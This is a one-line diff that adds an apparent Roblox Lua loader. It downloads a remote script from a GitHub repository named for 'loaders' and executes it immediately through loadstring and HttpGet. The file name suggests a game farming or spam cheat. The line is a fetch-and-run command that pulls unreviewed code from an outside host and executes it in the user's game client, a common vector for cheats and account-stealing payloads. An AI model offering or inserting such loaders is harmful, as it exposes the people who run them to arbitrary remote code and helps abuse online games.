@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/prehistoric-farm-new-world-spam3-1ou3t1rrkvjkhj.lua"))()
